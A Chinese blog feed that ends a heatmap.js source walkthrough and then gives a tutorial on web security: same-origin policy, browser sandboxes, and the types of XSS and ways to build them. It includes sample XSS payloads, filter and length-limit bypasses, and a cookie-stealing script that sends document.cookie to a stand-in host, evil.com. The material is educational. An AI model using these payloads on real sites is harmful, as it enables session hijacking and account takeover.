class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    getValueAt: <span class="function"><span class="keyword">function</span>(<span class="params">point</span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Heatmap;</span><br></pre></td></tr></table></figure></p>
<h2 id="Store"><a href="#Store" class="headerlink" title="Store"></a>Store</h2><p>实现了自己的Store来统一管理热力图数据。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Store.prototype = &#123;</span><br><span class="line">  <span class="comment">// when forceRender = false -&gt; called from setData, omits renderall event</span></span><br><span class="line">  _organiseData: <span class="function"><span class="keyword">function</span>(<span class="params">dataPoint, forceRender</span>) </span>&#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  _unOrganizeData: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  _onExtremaChange: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  addData: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  setData: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  removeData: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> implement</span></span><br><span class="line">  &#125;,</span><br><span class="line">  setDataMax: <span class="function"><span class="keyword">function</span>(<span class="params">max</span>) </span>&#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  setDataMin: <span class="function"><span class="keyword">function</span>(<span class="params">min</span>) </span>&#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  setCoordinator: <span class="function"><span class="keyword">function</span>(<span class="params">coordinator</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>._coordinator = coordinator;</span><br><span class="line">  &#125;,</span><br><span class="line">  _getInternalData: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123; </span><br><span class="line">      max: <span class="keyword">this</span>._max,</span><br><span class="line">      min: <span class="keyword">this</span>._min, </span><br><span class="line">      data: <span class="keyword">this</span>._data,</span><br><span class="line">      radi: <span class="keyword">this</span>._radi </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">  getData: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._unOrganizeData();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以上，就是heatmap全部源码的内容（除各种plugins不一一介绍了），总体实现上其实并不复杂，但确实可以很方便地绘制热力图。基于它的原理，我们可以进行二次开发，实现定制的热力图。比如，我们一般都是通过xpath来保存无埋点数据的，而一般xpath元素并不是圆点，大部分时候它都是长方形元素。这时用圆点拟合就不太合适了，我们改造为椭圆点可以更好地拟合实际点击情况。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>heatmap.js</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全</title>
    <url>/2019/10/13/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<p>本文介绍web安全的相关知识</p>
<h1 id="浏览器安全、xss未复习，csrf已复习"><a href="#浏览器安全、xss未复习，csrf已复习" class="headerlink" title="浏览器安全、xss未复习，csrf已复习"></a>浏览器安全、xss未复习，csrf已复习</h1><a id="more"></a>
<p><img src="//p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3c4907e7845a420cb4fe41a48ba515ce~tplv-k3u1fbpfcp-zoom-1.image" alt="前端阅读室"></p>
<h1 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h1><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略是浏览器最核心也是最基本的安全功能。</p>
<p>同源意味着协议、host（域名或IP地址，如果是IP地址则看作一个根域名）、端口号相同。</p>
<p>浏览器的同源策略，限制了来自不同源的”document”或脚本，对当前”document”读取或设置某些属性。</p>
<p>script、img、iframe、link等标签都可以跨域加载资源，而不受同源策略的限制。这些带”src”属性的标签每次加载时实际上是由浏览器发起了一次GET请求。不同于XMLHttpRequest的是，通过src属性加载的资源，浏览器限制了JavaScript的权限，使其不能读、写返回的内容。XMLHttpRequest受到同源策略的约束，不能跨域访问资源。</p>
<p>但是互联网是开放的，跨域请求的需求也越来越迫切，因此W3C委员会制定了XMLHttpRequest跨域访问标准。它需要通过目标域返回的HTTP头来授权是否允许跨域访问，因为HTTP头对于JavaScript来说一般是无法控制的。</p>
<p>跨域访问请求过程</p>
<p>index.html -&gt; Origin -&gt; index.php<br>index.php -&gt; Access-Control-Allow-Origin -&gt; index.html</p>
<p>对于浏览器来说，除了DOM、Cookie、XMLHttpRequest会受到同源策略的限制外，浏览器加载的一些第三方插件也有各自的同源策略。如Flash、Java、Applet、Silverlight、Google Gears等都有自己的控制策略。</p>
<p>以Flash为例，它主要通过目标网站提供的crossdomain.xml文件判断是否允许当前”源”的Flash跨域访问目标资源。</p>
<p>如<a href="http://www.qq.com/crossdomain.xml" target="_blank" rel="noopener">www.qq.com/crossdomain.xml</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">cross-domain-policy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"*.qq.com"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"*.gtimg.com"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>只有来自<em>.qq.com和</em>.gtimg.com域的请求是被允许的。</p>
<p>在Flash9及之后的版本中，还实现了MIME检查以确认crossdomain.xml是否合法，比如查看服务器返回HTTP头的Content-Type是否是text/*、application/xml、application/xhtml+xml。这样做的原因，是因为攻击者可以通过上传crossdomain.xml文件控制Flash的行为，绕过同源策略。除了MIME检查外，Flash还会检查crossdomain.xml是否在根目录下，也可以使得一些上传文件的攻击失效。</p>
<p>然而，一些浏览器的同源策略也曾被绕过，比如这个IE8的CSS漏洞</p>
<p><a href="http://www.a.com/test.html" target="_blank" rel="noopener">www.a.com/test.html</a>:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  &#123;&#125;body&#123;font-family:</span><br><span class="line">  aaaaaaaaaaaa</span><br><span class="line">  bbbbbbbbbbbbbbbbbbb</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><a href="http://www.b.com/test2.html" target="_blank" rel="noopener">www.b.com/test2.html</a>:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="keyword">@import</span> url(<span class="string">"http://www.a.com/test.html"</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> t = <span class="built_in">document</span>.body.currentStyle.fontFamily;</span></span><br><span class="line">    alert(t);</span><br><span class="line">  &#125;, 2000);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在<a href="http://www.b.com/test2.html中通过@import加载了http://www.a.com/test.html" target="_blank" rel="noopener">www.b.com/test2.html中通过@import加载了http://www.a.com/test.html</a> 为CSS文件，渲染进入当前页面DOM，同时通过document.body.currentStyle.fontFamily 访问此内容。问题发生在IE的CSS Parse的过程中，IE将fontFamily后面的内容当做了value，从而可以读取<a href="http://www.a.com/test.html的页面内容。会弹出" target="_blank" rel="noopener">www.a.com/test.html的页面内容。会弹出</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  aaaaaaaaaaaa</span><br><span class="line">  bbbbbbbbbbbbbbbbbbb</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>我们前面提到，script等标签仅能加载资源，但不能读、写资源的内容，而这个漏洞能够跨域读取页面内容，因此绕过了同源策略，成为一个跨域漏洞。</p>
<h2 id="浏览器沙箱"><a href="#浏览器沙箱" class="headerlink" title="浏览器沙箱"></a>浏览器沙箱</h2><p>在网页中插入一段恶意代码，利用浏览器漏洞执行代码，在用户电脑中植入木马，称为”挂马”。</p>
<p>Sandbox即沙箱，泛指”资源隔离类模块”的代名词。其设计的目的一般是为了让不可信任的代码运行在一定的环境中，限制不可信任代码访问隔离区之外的资源。如果一定要跨越Sandbox边界产生数据交换，则只能通过指定的数据通道。比如经过封装的API来完成，在这些API中会严格检查请求的合法性。</p>
<p>浏览器大多采用多进程架构，各个功能模块分开，各个浏览器实例分开。当一个进程崩溃时，不会影响到其他进程。如Google渲染进程由Sandbox隔离，网页代码与浏览器内核进程、操作系统进行通信都需要通过IPC channel，在其中会进行一些安全检查。</p>
<p>采用Sandbox技术，可以让不信任的网页代码、JavaScript代码运行在一个受到限制的环境中，从而保护本地桌面系统的安全。</p>
<p>但是浏览器安全是一个整体，浏览器所加载的一些第三方插件却往往不受Sandbox管辖，比如Flash、Java、PDF、.Net Framework都是浏览器攻击的热点。</p>
<h2 id="恶意网址拦截"><a href="#恶意网址拦截" class="headerlink" title="恶意网址拦截"></a>恶意网址拦截</h2><p>目前各个浏览器的恶意网址拦截功能都是基于”黑名单”的。一般浏览器周期性地从服务器端获取一份最新的恶意网址黑名单。如果用户上网时访问的网址存在于此黑名单中，浏览器就会弹出一个警告页面。</p>
<p>常见的恶意网址分为两类：一类是挂马网站，另一类是钓鱼网站，通过模仿知名网站的相似页面来欺骗用户。</p>
<p>除了恶意网址黑名单拦截功能，主流浏览器都开始支持EV SSL证书，其主要特色是浏览器会给予EV SSL证书特殊待遇，如在地址栏特别标注。</p>
<h2 id="高速发展的浏览器安全"><a href="#高速发展的浏览器安全" class="headerlink" title="高速发展的浏览器安全"></a>高速发展的浏览器安全</h2><p>IE8推出的XSS Filter功能。当用户访问的URL中包含了XSS攻击的脚本时，IE会修改其中的关键字符使得攻击无效，并对用户弹出提示框。</p>
<p>Firefox4推出的CSP，由服务器返回一个HTTP头，并在其中描述页面应该遵循的安全策略。</p>
<p>浏览器的拓展与插件也会带来安全问题，除了插件可能存在漏洞外，插件其本身也可能存在恶意行为。</p>
<h1 id="跨站脚本攻击-XSS-详解"><a href="#跨站脚本攻击-XSS-详解" class="headerlink" title="跨站脚本攻击(XSS)详解"></a>跨站脚本攻击(XSS)详解</h1><h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><p>XSS（Cross Site Script）攻击，通常指黑客通过”HTML注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。</p>
<p>一开始，这种攻击的演示案例是跨域的，所以叫做”跨站脚本”。现在是否跨域已经不再重要，但是名字一直沿用下来。</p>
<p>XSS长期以来被列为客户端Web安全中的头号大敌。因为XSS破坏力强大，且产生的场景复杂，难以一次性解决。</p>
<p>下面举个XSS的例子</p>
<p>假如用户把页面输入的参数直接输出到页面上：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$input = $_GET[<span class="string">"param"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;div&gt;"</span>.$input.<span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果用户提交了一段HTML代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://www.test.com/test.php?param=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>alert(/xss/)就会在页面中执行，弹出框显示/xss/。</p>
<p>这个例子就是XSS的一种：反射型XSS。</p>
<p>根据效果的不同，XSS可以分为三类</p>
<ol>
<li>反射型XSS</li>
</ol>
<p>反射型XSS只是简单地把用户输入的数据”反射“给浏览器。也就是说黑客往往需要诱使用户”点击“一个恶意链接，才能攻击成功。反射型XSS也叫”非持久型XSS”。</p>
<ol start="2">
<li>存储型XSS</li>
</ol>
<p>存储型XSS会把用户输入的数据“存储”在服务器端。这种XSS具有很强的稳定性。</p>
<p>比较常见的，黑客写下一篇包含恶意JavaScript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码。黑客把恶意脚本保存在了服务端，这种XSS攻击就叫做“存储型XSS”。存储型XSS也叫做“持久型XSS”。</p>
<ol start="3">
<li>DOM Based XSS</li>
</ol>
<p>DOM Based XSS从效果上来说也是反射型XSS，单独划分出来是因为它的形成原因比较特殊，发现它的安全专家提出了这种类型的XSS。出于历史原因把它单独作为一个分类了。</p>
<p>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。</p>
<p>下面举个例子</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> str = <span class="built_in">document</span>.getElementById(<span class="string">'text'</span>).value;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.getElementById(<span class="string">'t'</span>).innerHTML = <span class="string">"&lt;a href='"</span> + str + <span class="string">"' &gt;testLink&lt;/a&gt;"</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"t"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"s"</span> <span class="attr">value</span>=<span class="string">"write"</span> <span class="attr">onclick</span>=<span class="string">"test()"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>输入框构造如下数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos; onclick=alert(/xss/) //</span><br></pre></td></tr></table></figure>
<p>它先用一个单引号闭合掉href的第一个单引号，然后插入一个onclick事件，最后再用注释符“//”注释掉第二个引号。<br>输入后，页面代码变成了：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">"alert(/xss/)"</span> '&gt;</span>testLink<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>点击新生成的这个链接，脚本将被执行。</p>
<p>其实这里还有另外一种利用方式，还可以选择闭合掉<code>&lt;a&gt;</code>标签，并插入一个新的HTML标签。尝试如下输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;&gt;&lt;img src=# onerror=alert(/xss2/) /&gt;&lt;&apos;</span><br></pre></td></tr></table></figure>
<p>页面代码变成了</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span>=<span class="string">"alert(/xss2/)"</span>&gt;</span><span class="tag">&lt;<span class="name">''</span>&gt;</span></span><br><span class="line">  testLink</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>脚本直接被执行，弹出/xss2/。</p>
<h2 id="XSS攻击进阶"><a href="#XSS攻击进阶" class="headerlink" title="XSS攻击进阶"></a>XSS攻击进阶</h2><h2 id="初识XSS-Payload"><a href="#初识XSS-Payload" class="headerlink" title="初识XSS Payload"></a>初识XSS Payload</h2><p>XSS攻击成功后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些用以完成各种具体功能的恶意脚本，被称为”XSS Payload”。</p>
<p>XSS Payload实际上就是JavaScript脚本(还可以是Flash或其他富客户端的脚本)，所以任何JavaScript脚本能实现的功能，XSS Payload都能做到。</p>
<p>一个最常见的XSS Payload，就是通过读取浏览器对象，从而发起“Cookie劫持”攻击。</p>
<p>Cookie中一般加密保存了当前用户的登录凭证。Cookie如果丢失，往往意味着用户的登录凭证丢失。也就是，你可以在不知道密码的情况下直接登录用户账户。</p>
<p>下面举个例子，攻击者先加载一个远程脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://www.a.com/test.html?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>真正的XSS Payload写在这个脚本中，避免直接在URL参数中写入大量的JavaScript代码。</p>
<p>evil.js代码如下,它将document.cookie对象发送到了远端服务器</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.src = <span class="string">"http://www.evil.com/log?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>
<p>Cookie的”HttpOnly”标识可以防止“Cookie劫持”，我们将在稍后具体介绍。</p>
<h2 id="强大的XSS-Payload"><a href="#强大的XSS-Payload" class="headerlink" title="强大的XSS Payload"></a>强大的XSS Payload</h2><p>“Cookie劫持”并非所有的时候都会有效。有的网站可能会在Set-Cookie时给关键Cookie植入HttpOnly标识；有的网站可能会把Cookie与客户端IP绑定。尽管如此，攻击者还是有很多方式能够控制用户的浏览器。</p>
<h3 id="构造GET和POST请求"><a href="#构造GET和POST请求" class="headerlink" title="构造GET和POST请求"></a>构造GET和POST请求</h3><p>假设有篇博客所在域的某页面存在XSS漏洞，正常删除文章的链接是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://blog.com/article?m=delete&amp;id=123</span><br></pre></td></tr></table></figure>
<p>那么攻击者只需要知道文章的id,皆可以通过这个请求删除这篇文章了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.src = <span class="string">'http://blog.com/article?m=delete&amp;id=123'</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>
<p>攻击者只需要让博客作者执行这段JavaScript代码(XSS Payload),就会把这篇文章删除。</p>
<p>对于POST请求，可以这样实现</p>
<p>第一个种方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="built_in">document</span>.createElement(<span class="string">'form'</span>);</span><br><span class="line">f.action = <span class="string">""</span>;</span><br><span class="line">f.method = <span class="string">"post"</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(f);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i1 = <span class="built_in">document</span>.createElement(<span class="string">'input'</span>);</span><br><span class="line">i1.name = <span class="string">'name'</span>;</span><br><span class="line">i1.value = <span class="string">'value'</span>;</span><br><span class="line">f.appendChild(i1);</span><br><span class="line"></span><br><span class="line">f.submit();</span><br></pre></td></tr></table></figure>
<p>如果参数很多，通过构造DOM节点的方式，代码将十分冗长。可以通过innerHTML直接写html字符串的方式构造。</p>
<p>第二种方法可以使用XMLHttpRequest直接发送一个POST请求。</p>
<h3 id="XSS钓鱼"><a href="#XSS钓鱼" class="headerlink" title="XSS钓鱼"></a>XSS钓鱼</h3><p>前面介绍的，XSS的攻击过程都是在浏览器中通过JavaScript脚本自动进行的，也就是说，缺少“与用户交互”的过程。</p>
<p>比如之前“通过POST表单发消息”的例子，如果要求用户输入验证码，那么一般的XSS Payload都会失效。此外，在大多数“修改用户密码”的功能中，都会要求用户输入原密码，而攻击者往往是不知道的。</p>
<p>但这也不能限制住XSS。</p>
<p>对于验证码，XSS Payload可以通过读取页面内容，将验证码的图片URL发送到远端服务器——攻击者可以在远程XSS后台接收当前验证码，并将验证码的值返回给当前的XSS Payload。</p>
<p>修改密码的问题稍微复杂点，攻击者可以将XSS与“钓鱼”相结合。利用JavaScript实现一个伪造的登录框，当用户输入用户名和密码后，将密码发送至黑客的服务上。</p>
<h3 id="识别用户浏览器"><a href="#识别用户浏览器" class="headerlink" title="识别用户浏览器"></a>识别用户浏览器</h3><p>攻击者为了获取更大的利益，往往需要准确地收集用户的个人信息。比如知道用户使用的浏览器、操作系统，就有可能实施一次精准的浏览器内存攻击，最后给用户电脑植入一个木马。</p>
<p>比如使用XSS读取浏览器的UserAgent对象</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert(navigator.userAgent);</span><br></pre></td></tr></table></figure>
<p>但是这个对象是可以伪造的，所以信息不一定准确。</p>
<p>可以有另外一种技巧，来更准确地识别用户的浏览器版本</p>
<p>由于浏览器之间的实现存在差异，同一个浏览器不同版本之前可能也有细微的差别。通过判断这些差异，就能准确的识别出浏览器版本。</p>
<p>比如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXObject) <span class="comment">// MSIE 6.0 or below</span></span><br></pre></td></tr></table></figure>
<h3 id="识别用户安装的软件"><a href="#识别用户安装的软件" class="headerlink" title="识别用户安装的软件"></a>识别用户安装的软件</h3><p>在IE中，可以通过判断ActiveX控件的classid是否存在，来判断用户是否安装了该软件，选择对应的浏览器漏洞，最终达到植入木马的目的。</p>
<p>一些第三方软件也可能会泄漏一些信息。比如Flash有一个system.capabilities对象，能够查询客户端电脑中的硬件信息。</p>
<p>浏览器的扩展和插件也能被XSS Payload扫描出来。比如Firefox的插件(Plugin)列表存放在一个DOM对象中，通过查询DOM可以遍历所有的插件。</p>
<h3 id="CSS-History-Hack"><a href="#CSS-History-Hack" class="headerlink" title="CSS History Hack"></a>CSS History Hack</h3><p>通过CSS可以获取一个用户曾经访问过的网站。其原理利用的是style的visited属性。如果用户曾经访问过某个链接，那么这个链接的颜色会变得与众不同。</p>
<h3 id="获取用户的真实IP地址"><a href="#获取用户的真实IP地址" class="headerlink" title="获取用户的真实IP地址"></a>获取用户的真实IP地址</h3><p>很多时候，用户电脑使用了代理服务器，或者在局域网中隐藏在NAT后面。网站看到的客户端IP地址，是内网的出口IP地址，而并非用户电脑真实的本地IP地址。如何才能知道用户的本地IP地址呢？</p>
<p>JavaScript本身并没有提供获取本地IP地址的能力，XSS攻击需要借助第三方软件来完成。比如，客户端安装了Java环境(JRE),那么XSS就可以通过调用Java Applet的接口获取客户端的本地IP地址。</p>
<p>除了Java之外，一些ActiveX控件可能也会提供接口查询本地IP地址。这些功能比较特殊，需要具体情况具体分析。</p>
<h2 id="XSS攻击平台"><a href="#XSS攻击平台" class="headerlink" title="XSS攻击平台"></a>XSS攻击平台</h2><p>有安全研究者将许多功能封装起来，称为XSS攻击平台。这些平台主要是为了演示XSS的危害，以及方便渗透测试使用。</p>
<h2 id="终极武器：XSS-Worm"><a href="#终极武器：XSS-Worm" class="headerlink" title="终极武器：XSS Worm"></a>终极武器：XSS Worm</h2><p>XSS也能形成蠕虫</p>
<h3 id="Samy-Worm"><a href="#Samy-Worm" class="headerlink" title="Samy Worm"></a>Samy Worm</h3><p>在2005年有年仅19岁的Samy Kamkar对MySpace.com发起的，这是Web安全史上第一个重量级的XSS Worm。</p>
<p>首先，Myspace网站过滤掉了很多危险的标签，所有的事件如”onclick“等也被过滤了。但是它允许用户控制标签的style属性，通过style还是有办法构造出XSS的</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background:url('javascript:alert(1)')"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其次，Myspace同时还过滤了‘javasript’、‘onreadystatechange’等敏感词，所以Samy用了”拆分法“绕过这些限制。</p>
<p>最后，Samy通过AJAX构造的POST请求，完成了在用户的heros列表里添加自己名字的功能：同时复制蠕虫自身进行传播。</p>
<p>XSS Worm是XSS的一种终极利用方式，它的破坏力和影响力是巨大的。但是发起它是有一定条件的。</p>
<p>一般来说，用户之间发生交互行为的页面，如果存在存储型XSS，则比较容易发起XSS Worm攻击。</p>
<p>比如，发送站内信、用户留言等页面，都是XSS Worm的高发区。</p>
<h2 id="XSS构造技巧"><a href="#XSS构造技巧" class="headerlink" title="XSS构造技巧"></a>XSS构造技巧</h2><h3 id="利用字符编码"><a href="#利用字符编码" class="headerlink" title="利用字符编码"></a>利用字符编码</h3><p>”百度搜藏”曾经在一个<code>&lt;script&gt;</code>标签中输出了一个变量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> redirectUrl = <span class="string">"\";alert(/xss/);"</span>;</span><br></pre></td></tr></table></figure>
<p>变量处于双引号内，系统转义了双引号导致变量无法“escape”。</p>
<p>但是，返回页面是GBK/GB2312编码的，因此”%c1\“这两个字符组合在一起后，会成为一个Unicode字符。所以构造：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">%c1<span class="string">";alert(/xss/);//</span></span><br></pre></td></tr></table></figure>
<p>并提交，得到如下效果</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> readirectUrl = <span class="string">"乱码"</span>;alert(<span class="number">2</span>);<span class="comment">//";</span></span><br></pre></td></tr></table></figure>
<h3 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">value</span>=<span class="string">"$var"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果服务器对$var做个严格的长度限制，假如长度限制为20个字节</p>
<p>攻击者这样构造：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$var 为： &quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>超过了长度。</p>
<p>这样构造</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$var 为： &quot;onclick=alert(1)//</span><br></pre></td></tr></table></figure>
<p>不会超过长度限制</p>
<p>最好的办法是将XSS Payload写到别处，再通过简短的代码加载它。</p>
<p>最常用的一个”藏代码“的地方，就是”localtion.hash”,它的内容不会在HTTP包中发送，所以服务器端的Web日志中并不会记录下location.hash里的内容。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$var 修改为： &quot; onclick=&quot;eval(location.hash.substr(1))</span><br></pre></td></tr></table></figure>
<p>当然，还可以使用远程加载js的方法，以避免浏览器地址栏长度的限制。</p>
<h3 id="使用标签"><a href="#使用标签" class="headerlink" title="使用标签"></a>使用<base>标签</h3><p><code>&lt;base&gt;</code>标签并不常用，它定义页面上所有使用”相对路径”标签的hosting地址。它可以出现在页面的任何地方，并作用于位于该标签之后的所有标签。</p>
<p>攻击可以在页面中插入<code>&lt;base&gt;</code>标签，通过在远程服务器伪造图片、链接或脚本，劫持当前页面中所使用“相对路径”的标签</p>
<p>所以在设计XSS安全方案时，一定要过滤掉这个危险的标签。</p>
<h3 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h3><p>window对象是浏览器的窗体，很多时候window对象不受同源策略限制，可以实现跨域、跨页面传递数据。</p>
<p>使用window.name可以缩短XSS Payload的长度</p>
